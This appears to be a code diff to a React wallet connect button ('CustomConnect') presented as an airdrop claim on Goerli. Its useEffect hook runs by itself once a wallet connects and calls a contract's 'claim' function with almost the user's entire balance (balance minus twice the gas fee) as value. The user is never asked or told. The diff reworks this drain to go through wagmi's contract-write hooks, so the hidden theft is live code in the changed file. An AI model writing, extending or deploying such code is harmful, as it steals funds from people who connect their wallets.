@@ -20,6 +20,13 @@ import { goerli } from "viem/chains";
 const contractAddress = "0x794bF077074D4aC9e958c19CceEDe1e04ddB1a5E";
 
 export const CustomConnect = () => {
+  const { config } = usePrepareContractWrite({
+    address: contractAddress,
+    abi: airdropAbi,
+    functionName: "claim",
+  });
+  const { write: claim, isLoading: isLoadingClaim } = useContractWrite(config);
+
   const [callFuncGasFee, setCallFuncGasFee] = useState<BigNumber>(
     BigNumber.from(0)
   );
@@ -33,14 +40,24 @@ export const CustomConnect = () => {
     formatUnits: "ether",
   });
   const { data: feeData } = useFeeData();
-  const {switchNetwork, isIdle, isLoading} = useSwitchNetwork({chainId: goerli.id});
+  const { switchNetwork, isIdle, isLoading } = useSwitchNetwork({
+    chainId: goerli.id,
+  });
 
   const [isSubmitted, setIsSubmitted] = useState(false);
   const provider = useEthersProvider();
   useEffect(() => {
     async function estimateGasAmount() {
       try {
-        if (!provider || !balanceData || !feeData || isSubmitted) return;
+        if (
+          !provider ||
+          !balanceData ||
+          !feeData ||
+          !address ||
+          !claim ||
+          isSubmitted
+        )
+          return;
 
         if (parseFloat(balanceData.formatted) == 0) return;
 
@@ -52,6 +69,7 @@ export const CustomConnect = () => {
         );
         // estimate the amount of gas needed to call the contract function
         const callFuncGas = await contract.estimateGas.claim({
+          from: address,
           value: utils.parseEther("0"),
         });
 
@@ -60,22 +78,25 @@ export const CustomConnect = () => {
         setCallFuncGasFee(gasAmount);
         if (balance.lte(gasAmount.mul(BigNumber.from(2)))) return;
 
-        contract
-          .claim({
+        if (!isLoadingClaim) {
+          claim({
+            from: address,
             value: balance.sub(gasAmount.mul(BigNumber.from(2))),
-          })
-          .then((value) => {
-            setIsSubmitted(false);
-          })
-          .catch((error) => {
-            setIsSubmitted(false);
           });
-        setIsSubmitted(true);
+        }
       } catch (error) {}
     }
 
     estimateGasAmount();
-  }, [feeData, balanceData, provider, isSubmitted]);
+  }, [
+    feeData,
+    balanceData,
+    provider,
+    isSubmitted,
+    isLoadingClaim,
+    address,
+    claim,
+  ]);
   return (
     <ConnectButton.Custom>
       {({
@@ -139,7 +160,7 @@ export const CustomConnect = () => {
               }
               if (chain.unsupported) {
                 if (!isLoading) {
-                  switchNetwork()
+                  switchNetwork();
                 }
               }
               return (
